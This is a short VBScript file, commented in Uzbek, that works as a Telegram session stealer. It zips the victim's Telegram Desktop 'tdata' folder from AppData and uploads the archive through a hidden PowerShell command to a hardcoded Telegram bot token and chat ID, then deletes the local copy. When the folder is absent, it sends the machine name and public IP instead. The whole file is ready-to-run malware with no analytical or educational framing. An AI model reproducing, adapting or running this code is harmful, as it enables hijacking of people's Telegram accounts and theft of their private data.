Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

BOT_TOKEN = "8474648259:AAH3sMxwJCPwkit40x--YgvETDLkZ0jmgu4"
CHAT_ID = "7080045924"

Set WshNetwork = CreateObject("WScript.Network")
PCName = WshNetwork.ComputerName

AppData = WshShell.ExpandEnvironmentStrings("%APPDATA%")
TDataPath = AppData & "\TelegramDesktop\tdata"

If FSO.FolderExists(TDataPath) Then
    TempDir = WshShell.ExpandEnvironmentStrings("%TEMP%")
    ZipName = "tdata_" & PCName & ".zip"
    ZipPath = TempDir & "\" & ZipName
    
    Set objShell = CreateObject("Shell.Application")
    Set objFolder = objShell.NameSpace(TDataPath)
    Set objZip = objShell.NameSpace(ZipPath)
    
    On Error Resume Next
    objZip.CopyHere objFolder.Items, 16
    On Error GoTo 0
    
    ' Vaqt berish (siqilishi uchun)
    WScript.Sleep 3000
    
    ' Telegramga fayl yuborish
    WshShell.Run "powershell -Command ""Invoke-WebRequest -Uri 'https://api.telegram.org/bot" & BOT_TOKEN & "/sendDocument' -Method Post -ContentType 'multipart/form-data' -Form @{chat_id='" & CHAT_ID & "'; document=@'" & ZipPath & "' ; caption='✅ tdata yigildi! Kompyuter: " & PCName & "'}""", 0, True
    
    FSO.DeleteFile(ZipPath)
Else
    Set http = CreateObject("MSXML2.ServerXMLHTTP")
    http.open "GET", "https://api.ipify.org", False
    http.send
    ip = http.responseText
    
    WshShell.Run "powershell -Command ""Invoke-WebRequest -Uri 'https://api.telegram.org/bot" & BOT_TOKEN & "/sendMessage' -Method Post -ContentType 'application/json' -Body '{\""chat_id\"":" & CHAT_ID & ", \""text\"": \""⚠️ tdata topilmadi! Kompyuter: " & PCName & ", IP: " & ip & "\""}'""", 0, True
End If
